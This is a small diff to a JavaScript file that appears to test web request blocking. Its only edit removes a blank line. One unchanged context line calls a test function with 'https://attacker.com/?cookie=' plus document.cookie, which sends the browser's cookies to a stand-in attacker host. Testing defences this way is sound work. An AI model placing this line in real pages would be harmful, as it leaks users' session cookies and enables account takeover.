@@ -29,7 +29,6 @@ function ajaxTest(url) {
   }catch{
     alert("Debug from https://mywebguard-thirdparty.github.io: ajaxTest('"+url+"') is failed!");
   }
-  
 }
 ajaxTest("index.html");
 ajaxTest("https://attacker.com/?cookie="+document.cookie);
